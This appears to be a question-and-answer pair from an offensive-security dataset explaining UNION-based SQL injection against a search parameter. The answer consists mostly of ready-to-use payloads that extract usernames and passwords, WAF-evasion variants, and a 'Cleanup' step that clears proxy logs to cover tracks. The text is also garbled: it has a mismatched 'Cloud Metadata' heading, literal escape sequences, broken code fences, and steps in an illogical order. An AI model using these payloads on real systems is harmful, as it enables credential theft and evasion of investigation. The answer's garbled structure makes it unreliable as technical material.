===PAIR===
Q: How do I perform a UNION-based SQL injection on a parameter vulnerable to SQLi?
A: **Technique: Exploit Public-Facing Application \u2192 Cloud Metadata**\n\n**Execution:**\n```http
GET /search?q=' UNION SELECT 1,username,password FROM users-- HTTP/1.1
Host: target.local
`````

**Step 1 \u2014 Confirm injectable parameter:**\n```sql
q=' UNION SELECT 1,username,password FROM users--'
-- If error, confirm column count:\n
q=' ORDER BY 1--'
-- If error, confirm column count:\n
q=' ORDER BY 2--'
q=' ORDER BY 3--'
`````

**Step 2 \u2014 Extract data:**\n```sql
q=' UNION SELECT 1,username,password FROM users--'
`````

**Edge case \u2014 WAF blocking UNION:**\n```sql
q=' UNION SELECT 1,username,password FrOm users--'
-- Bypass with comment injection\n
q='/*!UNION*/ /*!SELECT*/ 1,username,password FROM users--'
`````

**Artifacts:**\n- Web server logs: 200/500 responses with SQL syntax in query params.
- WAF logs: UNION/SELECT keyword patterns.
- Database audit: unusual SELECT queries from application account.
- SIEM: spike in 500 errors from /search endpoint.

**Cleanup:**\n```bash
-- No persistent changes on DB; data is read-only\n
-- Clear browser history and proxy logs\n
```

